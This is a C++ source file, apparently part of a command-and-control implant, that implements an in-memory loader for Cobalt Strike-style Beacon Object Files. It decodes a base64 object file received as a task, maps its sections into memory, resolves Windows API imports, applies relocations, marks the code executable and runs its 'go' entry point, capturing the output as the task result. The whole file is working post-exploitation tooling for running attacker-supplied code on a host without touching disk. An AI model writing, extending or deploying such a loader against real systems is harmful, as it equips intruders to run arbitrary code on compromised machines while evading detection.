/*
 * BOF.cpp — In-memory COFF / Beacon Object File executor
 *
 * Ported from ObjectLdr (Main.c + BeaconApi.c).
 * Differences from the reference implementation:
 *   - Input comes from a base64-decoded byte buffer, not from disk.
 *   - BeaconOutput / BeaconPrintf write to a captured std::string
 *     instead of stdout, so the output is returned as the task result.
 *   - All printf() debug calls are removed.
 *   - Arguments from task.arguments are packed into the BOF binary
 *     format: [uint32 totalSize][uint32 len][bytes]...
 */

#include "BOF.h"
#include "Helpers.h"

#include <stdio.h>
#include <stdarg.h>
#include <string>
#include <vector>
#include <sstream>

// ── Page alignment ────────────────────────────────────────────────────────────
#define SIZE_OF_PAGE     0x1000
#define PAGE_ALIGN(x)    (((ULONG_PTR)(x)) + ((SIZE_OF_PAGE - (((ULONG_PTR)(x)) & (SIZE_OF_PAGE - 1))) % SIZE_OF_PAGE))

// ── Structures ────────────────────────────────────────────────────────────────
typedef struct _SECTION_MAP {
    PVOID Base;
    ULONG Size;
} SECTION_MAP, *PSECTION_MAP;

typedef struct _OBJECT_CTX {
    union {
        ULONG_PTR          Base;
        PIMAGE_FILE_HEADER Header;
    };
    PIMAGE_SYMBOL         SymTbl;
    PVOID*                SymMap;
    PSECTION_MAP          SecMap;
    PIMAGE_SECTION_HEADER Sections;
} OBJECT_CTX, *POBJECT_CTX;

// Beacon data-parser struct (mirrors BeaconApi.h)
typedef struct {
    char* original;
    char* buffer;
    int   length;
    int   size;
} datap;

// ── Per-thread output capture buffer ─────────────────────────────────────────
// Using thread-local storage avoids any data race if BOFs were ever run on
// multiple threads simultaneously.  The pointer is set before ObjectLdr()
// and cleared after.
static thread_local std::string* tls_bofOut = nullptr;

// ── Beacon API implementations ────────────────────────────────────────────────
static void BeaconDataParse(datap* parser, char* buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer   = buffer + 4;     // skip 4-byte total-size header
    parser->length   = size - 4;
    parser->size     = size - 4;
}

static int BeaconDataInt(datap* parser) {
    int v = 0;
    if (parser->length < 4) return 0;
    memcpy(&v, parser->buffer, 4);
    parser->buffer += 4;
    parser->length -= 4;
    return v;
}

static short BeaconDataShort(datap* parser) {
    short v = 0;
    if (parser->length < 2) return 0;
    memcpy(&v, parser->buffer, 2);
    parser->buffer += 2;
    parser->length -= 2;
    return v;
}

static int BeaconDataLength(datap* parser) {
    return parser->length;
}

static char* BeaconDataExtract(datap* parser, int* size) {
    int   length  = 0;
    char* outdata = nullptr;
    if (parser->length < 4) return nullptr;
    memcpy(&length, parser->buffer, 4);
    parser->buffer += 4;
    outdata         = parser->buffer;
    parser->length -= 4;
    parser->length -= length;
    parser->buffer += length;
    if (size) *size = length;
    return outdata;
}

// BeaconOutput and BeaconPrintf write to the capture buffer.
static void BeaconOutput(int /*type*/, char* data, int /*len*/) {
    if (tls_bofOut && data) {
        tls_bofOut->append(data);
        tls_bofOut->push_back('\n');
    }
}

static void BeaconPrintf(int /*type*/, char* fmt, ...) {
    if (!tls_bofOut || !fmt) return;
    char buf[4096] = {};
    va_list va;
    va_start(va, fmt);
    vsnprintf(buf, sizeof(buf) - 1, fmt, va);
    va_end(va);
    tls_bofOut->append(buf);
}

// ── Symbol resolution ─────────────────────────────────────────────────────────
static PVOID ObjectResolveSymbol(PSTR Symbol) {
    CHAR  Buffer[MAX_PATH] = {};
    PVOID Resolved = nullptr;
    PVOID Module   = nullptr;

    if (!Symbol) return nullptr;

    Symbol += 6; // skip "__imp_"

    // Beacon API dispatch
    if (strncmp("Beacon", Symbol, 6) == 0) {
        if      (strcmp("BeaconDataParse",   Symbol) == 0) Resolved = (PVOID)BeaconDataParse;
        else if (strcmp("BeaconDataInt",     Symbol) == 0) Resolved = (PVOID)BeaconDataInt;
        else if (strcmp("BeaconDataShort",   Symbol) == 0) Resolved = (PVOID)BeaconDataShort;
        else if (strcmp("BeaconDataLength",  Symbol) == 0) Resolved = (PVOID)BeaconDataLength;
        else if (strcmp("BeaconDataExtract", Symbol) == 0) Resolved = (PVOID)BeaconDataExtract;
        else if (strcmp("BeaconOutput",      Symbol) == 0) Resolved = (PVOID)BeaconOutput;
        else if (strcmp("BeaconPrintf",      Symbol) == 0) Resolved = (PVOID)BeaconPrintf;
        return Resolved;
    }

    // Windows API: "LIBRARY$Function"
    memcpy(Buffer, Symbol, min((int)strlen(Symbol), MAX_PATH - 1));
    PCHAR pos = strchr(Buffer, '$');
    if (!pos) return nullptr;
    *pos          = '\0';
    PSTR Library  = Buffer;
    PSTR Function = pos + 1;

    if (!(Module = GetModuleHandleA(Library)))
        Module = LoadLibraryA(Library);
    if (!Module) return nullptr;

    Resolved = GetProcAddress((HMODULE)Module, Function);
    RtlSecureZeroMemory(Buffer, sizeof(Buffer));
    return Resolved;
}

// ── Virtual size calculation ──────────────────────────────────────────────────
static ULONG ObjectVirtualSize(POBJECT_CTX ObjCtx) {
    ULONG Length = 0;

    for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++)
        Length += (ULONG)PAGE_ALIGN(ObjCtx->Sections[i].SizeOfRawData);

    for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
        PIMAGE_RELOCATION ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);
        for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
            PIMAGE_SYMBOL ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];
            PSTR Symbol = ObjSym->N.Name.Short
                ? (PSTR)ObjSym->N.ShortName
                : (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + ObjSym->N.Name.Long);

            if (strncmp("__imp_", Symbol, 6) == 0)
                Length += sizeof(PVOID);

            ObjRel = (PIMAGE_RELOCATION)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
        }
    }
    return (ULONG)PAGE_ALIGN(Length);
}

// ── Relocation fixup ──────────────────────────────────────────────────────────
// Machine is IMAGE_FILE_MACHINE_AMD64 or IMAGE_FILE_MACHINE_I386; kept separate
// because I386 and AMD64 relocation type constants share numeric values (e.g. both
// IMAGE_REL_AMD64_REL32_2 and IMAGE_REL_I386_DIR32 equal 6).
static VOID ObjectRelocation(WORD Machine, ULONG Type, PVOID Reloc, PVOID SecBase) {
    if (Machine == IMAGE_FILE_MACHINE_I386) {
        switch (Type) {
        case IMAGE_REL_I386_DIR32:
            *(PUINT32)Reloc += (UINT32)(ULONG_PTR)SecBase; break;
        case IMAGE_REL_I386_REL32:
            *(PUINT32)Reloc += (UINT32)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 4); break;
        }
    } else {
        switch (Type) {
        case IMAGE_REL_AMD64_REL32:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 4); break;
        case IMAGE_REL_AMD64_REL32_1:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 5); break;
        case IMAGE_REL_AMD64_REL32_2:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 6); break;
        case IMAGE_REL_AMD64_REL32_3:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 7); break;
        case IMAGE_REL_AMD64_REL32_4:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 8); break;
        case IMAGE_REL_AMD64_REL32_5:
            *(PUINT32)Reloc += (ULONG)((ULONG_PTR)SecBase - (ULONG_PTR)Reloc - 9); break;
        case IMAGE_REL_AMD64_ADDR64:
            *(PUINT64)Reloc += (ULONG64)SecBase; break;
        }
    }
}

// ── Section processing (import resolution + reloc application) ────────────────
static BOOL ObjectProcessSection(POBJECT_CTX ObjCtx) {
    ULONG FnIndex = 0;

    for (int i = 0; i < ObjCtx->Header->NumberOfSections; i++) {
        PIMAGE_RELOCATION ObjRel = (PIMAGE_RELOCATION)(ObjCtx->Base + ObjCtx->Sections[i].PointerToRelocations);

        for (int j = 0; j < ObjCtx->Sections[i].NumberOfRelocations; j++) {
            PIMAGE_SYMBOL ObjSym = &ObjCtx->SymTbl[ObjRel->SymbolTableIndex];
            PSTR Symbol = ObjSym->N.Name.Short
                ? (PSTR)ObjSym->N.ShortName
                : (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + ObjSym->N.Name.Long);

            PVOID Reloc    = (PVOID)((ULONG_PTR)ObjCtx->SecMap[i].Base + ObjRel->VirtualAddress);
            PVOID Resolved = nullptr;

            if (strncmp("__imp_", Symbol, 6) == 0) {
                Resolved = ObjectResolveSymbol(Symbol);
                if (!Resolved) {
                    if (tls_bofOut)
                        tls_bofOut->append("[BOF] failed to resolve: ").append(Symbol + 6).push_back('\n');
                    return FALSE;
                }
            }

            if (ObjRel->Type == IMAGE_REL_AMD64_REL32 && Resolved) {
                ObjCtx->SymMap[FnIndex] = Resolved;
                *(PUINT32)Reloc = (UINT32)(((ULONG_PTR)ObjCtx->SymMap + FnIndex * sizeof(PVOID)) - (ULONG_PTR)Reloc - sizeof(UINT32));
                FnIndex++;
            } else {
                PVOID SecBase = (PVOID)((ULONG_PTR)ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base + ObjSym->Value);
                ObjectRelocation(ObjCtx->Header->Machine, ObjRel->Type, Reloc, SecBase);
            }

            ObjRel = (PIMAGE_RELOCATION)((ULONG_PTR)ObjRel + sizeof(IMAGE_RELOCATION));
        }
    }
    return TRUE;
}

// ── Entry-point search and execution ─────────────────────────────────────────
static BOOL ObjectExecute(POBJECT_CTX ObjCtx, PSTR Entry, PBYTE Args, ULONG Argc) {
    for (int i = 0; i < ObjCtx->Header->NumberOfSymbols; i++) {
        PIMAGE_SYMBOL ObjSym = &ObjCtx->SymTbl[i];
        PSTR Symbol = ObjSym->N.Name.Short
            ? (PSTR)ObjSym->N.ShortName
            : (PSTR)((ULONG_PTR)(ObjCtx->SymTbl + ObjCtx->Header->NumberOfSymbols) + ObjSym->N.Name.Long);

        if (!ISFCN(ObjSym->Type) || strcmp(Symbol, Entry) != 0)
            continue;

        PVOID SecBase = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Base;
        ULONG SecSize = ObjCtx->SecMap[ObjSym->SectionNumber - 1].Size;
        ULONG Protect = 0;

        if (!VirtualProtect(SecBase, SecSize, PAGE_EXECUTE_READ, &Protect))
            return FALSE;

        typedef VOID(*BofEntry)(PBYTE, ULONG);
        BofEntry Main = (BofEntry)((ULONG_PTR)SecBase + ObjSym->Value);
        Main(Args, Argc);

        VirtualProtect(SecBase, SecSize, Protect, &Protect);
        return TRUE;
    }
    return FALSE;
}

// ── Main loader ───────────────────────────────────────────────────────────────
static BOOL ObjectLdr(PVOID pObject, PSTR sFunction, PBYTE pArgs, ULONG uArgc) {
    OBJECT_CTX ObjCtx  = {};
    ULONG      VirtSize = 0;
    PVOID      VirtAddr = nullptr;
    PVOID      SecBase  = nullptr;
    BOOL       Success  = FALSE;

    if (!pObject || !sFunction) return FALSE;

    ObjCtx.Header   = (PIMAGE_FILE_HEADER)pObject;
    ObjCtx.SymTbl   = (PIMAGE_SYMBOL)((ULONG_PTR)pObject + ObjCtx.Header->PointerToSymbolTable);
    ObjCtx.Sections = (PIMAGE_SECTION_HEADER)((ULONG_PTR)pObject + sizeof(IMAGE_FILE_HEADER));

    // Architecture check
    {
        SYSTEM_INFO si = {};
        GetNativeSystemInfo(&si);
        WORD expected;
        switch (si.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: expected = IMAGE_FILE_MACHINE_AMD64; break;
        case PROCESSOR_ARCHITECTURE_ARM64: expected = IMAGE_FILE_MACHINE_ARM64; break;
        default:                           expected = IMAGE_FILE_MACHINE_I386;  break;
        }
        if (ObjCtx.Header->Machine != expected) {
            if (tls_bofOut)
                tls_bofOut->append("Error: BOF architecture does not match the current process.");
            return FALSE;
        }
    }

    VirtSize = ObjectVirtualSize(&ObjCtx);

    if (!(VirtAddr = VirtualAlloc(nullptr, VirtSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE)))
        goto _CLEANUP;

    if (!(ObjCtx.SecMap = (PSECTION_MAP)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
            ObjCtx.Header->NumberOfSections * sizeof(SECTION_MAP))))
        goto _CLEANUP;

    SecBase = VirtAddr;
    for (int i = 0; i < ObjCtx.Header->NumberOfSections; i++) {
        ULONG SecSize = ObjCtx.Sections[i].SizeOfRawData;
        ObjCtx.SecMap[i].Base = SecBase;
        ObjCtx.SecMap[i].Size = SecSize;
        memcpy(SecBase, (PVOID)(ObjCtx.Base + ObjCtx.Sections[i].PointerToRawData), SecSize);
        SecBase = (PVOID)PAGE_ALIGN((ULONG_PTR)SecBase + SecSize);
    }

    // SymMap lives in the last page, after all sections
    ObjCtx.SymMap = (PVOID*)SecBase;

    if (!ObjectProcessSection(&ObjCtx))
        goto _CLEANUP;

    if (!ObjectExecute(&ObjCtx, sFunction, pArgs, uArgc)) {
        if (tls_bofOut)
            tls_bofOut->append("Error: entry point '").append(sFunction).append("' not found in BOF.");
        goto _CLEANUP;
    }

    Success = TRUE;

_CLEANUP:
    if (VirtAddr)       VirtualFree(VirtAddr, 0, MEM_RELEASE);
    if (ObjCtx.SecMap)  HeapFree(GetProcessHeap(), 0, ObjCtx.SecMap);
    RtlSecureZeroMemory(&ObjCtx, sizeof(ObjCtx));
    return Success;
}

// ── Argument packing ──────────────────────────────────────────────────────────
// Cobalt Strike BOF format:
//   [uint32 totalBlobSize][uint32 item1Len][item1 bytes]...
// BeaconDataParse skips the first 4 bytes; BeaconDataExtract reads
// a 4-byte length prefix before each item.
//
// If binaryBlob is non-empty it is prepended as a raw binary entry
// (no null terminator) so the BOF can call BeaconDataExtract to retrieve it
// before reading the string arguments.
static std::vector<BYTE> PackArguments(const std::vector<std::string>& args, const std::string& binaryBlob = "") {
    ULONG total = 4; // 4-byte header
    if (!binaryBlob.empty())
        total += 4 + (ULONG)binaryBlob.size(); // len prefix + raw bytes
    for (const auto& a : args)
        total += 4 + (ULONG)a.size() + 1; // len prefix + string + null

    std::vector<BYTE> buf(total, 0);
    memcpy(buf.data(), &total, 4);

    BYTE* ptr = buf.data() + 4;

    if (!binaryBlob.empty()) {
        ULONG len = (ULONG)binaryBlob.size();
        memcpy(ptr, &len, 4);           ptr += 4;
        memcpy(ptr, binaryBlob.data(), len);
        ptr += len;
    }

    for (const auto& a : args) {
        ULONG len = (ULONG)a.size() + 1;
        memcpy(ptr, &len, 4); ptr += 4;
        memcpy(ptr, a.c_str(), a.size());
        ptr[a.size()] = 0;
        ptr += len;
    }
    return buf;
}

// ── Public entry point ────────────────────────────────────────────────────────
std::string RunBOF(std::vector<std::string> arguments, const std::string& file_data, const std::string& file2_data) {
    if (file_data.empty())
        return "Error: no BOF data";

    std::string assembly = base64_decode(file_data);
    if (assembly.empty())
        return "Error: failed to decode BOF";

    if (assembly.size() < sizeof(IMAGE_FILE_HEADER))
        return "Error: file too small to be a COFF object";

    std::string output;
    tls_bofOut = &output;

    std::string binaryBlob;
    if (!file2_data.empty())
        binaryBlob = base64_decode(file2_data);

    std::vector<BYTE> packedArgs = PackArguments(arguments, binaryBlob);
    PBYTE pArgs = packedArgs.empty() ? nullptr : packedArgs.data();
    ULONG uArgc = (ULONG)packedArgs.size();

    BOOL ok = ObjectLdr((PVOID)assembly.data(), (PSTR)"go", pArgs, uArgc);

    tls_bofOut = nullptr;

    if (!ok && output.empty())
        return "Error: BOF execution failed";

    return output.empty() ? "(no output)" : output;
}
